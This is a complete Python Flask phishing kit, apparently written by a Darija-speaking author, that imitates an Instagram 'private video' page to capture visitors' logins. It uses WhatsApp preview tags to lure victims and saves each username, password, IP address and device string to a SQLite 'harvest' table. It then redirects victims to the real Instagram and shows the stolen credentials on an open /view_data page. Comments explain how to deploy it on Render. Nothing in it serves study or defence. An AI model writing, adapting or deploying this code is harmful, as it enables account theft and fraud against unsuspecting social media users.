#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram + فيديو Reel + متوافقة مع Render

import os
import sys
import sqlite3
import socket
import threading
import requests
from flask import Flask, request, redirect, render_template_string
from uuid import uuid4
from datetime import datetime
from threading import Thread

app = Flask(__name__)
DB_NAME = "mobo_captures.db"

class MoboPhisher:
    def __init__(self):
        self.app = app
        self.setup_routes()
        self.cred_count = 0
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
        })
        self.init_db()
        self.base_url = self.get_base_url()

    def get_base_url(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return f"http://{ip}:8080"
        except:
            return "http://mobo33:8080"

    def init_db(self):
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS harvest (
            id TEXT PRIMARY KEY,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.commit()
        conn.close()

    def spoof_login_page(self):
        # هاد الصفحة كتوري فيديو إنستغرام مسدود وكتطلب تسجيل الدخول باش يتفرج
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- هادو هوما الـ Meta Tags باش يخرج الفيديو فواتساب -->
    <meta property="og:title" content="⚠️ هل ترفع صوت السماعا..." />
    <meta property="og:description" content="Laith Alfathi sur Instagram" />
    <meta property="og:image" content="https://i.imgur.com/your_thumbnail_image.jpg" /> <!-- بدل هاد الرابط بصورة الفيديو اللي بغيتي -->
    <meta property="og:video" content="https://www.instagram.com/reel/DcHCV27ilyM/embed/" />
    <meta property="og:type" content="video.other" />
    <meta property="og:url" content="https://instagram.com" />
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
        }
        .video-container {
            position: relative;
            width: 100%;
            max-width: 400px;
            height: 600px;
            background: #111;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .video-blur {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(15px);
            opacity: 0.6;
        }
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(0,0,0,0.5);
            z-index: 10;
        }
        .lock-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
        .overlay-text {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
        }
        .login-btn {
            background-color: #0095F6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        /* صندوق تسجيل الدخول */
        .login-box {
            display: none;
            background: #fff;
            color: #262626;
            width: 100%;
            max-width: 350px;
            padding: 40px 30px;
            border-radius: 10px;
            text-align: center;
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }
        .login-box h2 {
            font-family: 'Billabong', 'Instagram Sans Script', cursive;
            font-size: 40px;
            margin-bottom: 20px;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #DBDBDB;
            border-radius: 4px;
            background: #FAFAFA;
            font-size: 14px;
        }
        .login-box button {
            width: 100%;
            background-color: #0095F6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="video-container">
        <!-- فيديو إنستغرام الأصلي -->
        <iframe class="video-blur" src="https://www.instagram.com/reel/DcHCV27ilyM/embed/" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>
        
        <div class="overlay" id="overlay">
            <div class="lock-icon">🔒</div>
            <div class="overlay-text">This video is private<br>Log in to watch</div>
            <button class="login-btn" onclick="showLogin()">Log In</button>
        </div>

        <div class="login-box" id="loginBox">
            <h2>Instagram</h2>
            <form method="POST" action="/submit">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>

    <script>
        function showLogin() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('loginBox').style.display = 'block';
        }
    </script>
</body>
</html>"""

    def setup_routes(self):
        @app.route('/')
        def home():
            return self.spoof_login_page()
        
        @app.route('/submit', methods=['POST'])
        def submit():
            username = request.form.get('username')
            password = request.form.get('password')
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent')
            
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO harvest (id, username, password, ip, user_agent) VALUES (?,?,?,?,?)",
                      (str(uuid4()), username, password, ip, user_agent))
            conn.commit()
            conn.close()
            return redirect("https://instagram.com", code=302)
        
        @app.route('/view_data')
        def view_data():
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("SELECT * FROM harvest ORDER BY timestamp DESC")
            data = c.fetchall()
            conn.close()
            
            html = """<!DOCTYPE html>
<html>
<head>
    <title>@mobo33.3 Harvested Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background: #121212; 
            color: #e0e0e0; 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            overflow-x: auto;
        }
        h1 {
            text-align: center;
            background: linear-gradient(45deg, #833ab4, #fd1d1d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 30px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #1e1e1e; 
            font-size: 14px;
        }
        th, td { 
            padding: 12px 15px; 
            border: 1px solid #333; 
            text-align: left; 
            word-break: break-all;
        }
        th { 
            background: #262626; 
            color: #fd1d1d; 
        }
        tr:nth-child(even) { 
            background: #1a1a1a; 
        }
        .back-btn {
            display: block; 
            width: 200px; 
            margin: 30px auto; 
            padding: 10px;
            background: linear-gradient(45deg, #833ab4, #fd1d1d); 
            color: white;
            text-align: center; 
            text-decoration: none;
            border-radius: 5px; 
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>@mobo33.3 Harvested Credentials</h1>
    <table>
        <tr>
            <th>ID</th>
            <th>Username</th>
            <th>Password</th>
            <th>IP</th>
            <th>Device</th>
            <th>Timestamp</th>
        </tr>"""
            
            for row in data:
                html += f"""
        <tr>
            <td>{row[0][:8]}...</td>
            <td>{row[1]}</td>
            <td><strong style="color:#00ff00">{row[2]}</strong></td>
            <td>{row[3]}</td>
            <td>{row[4][:50]}</td>
            <td>{row[5]}</td>
        </tr>"""
            
            html += """
    </table>
    <a href="/" class="back-btn">Back to Verification</a>
</body>
</html>"""
            return html

    def launch(self):
        # قراءة البورت من متغيرات البيئة ديال Render
        port = int(os.environ.get('PORT', 8080))
        
        print("\n" + "="*50)
        print(f"[+] Server starting on port {port}...")
        print("="*50)
        
        # تشغيل السيرفر مباشرة (بدون Thread وبدون input) ليعمل على Render
        app.run(host='0.0.0.0', port=port, threaded=True)

if __name__ == "__main__":
    phisher = MoboPhisher()
    phisher.launch()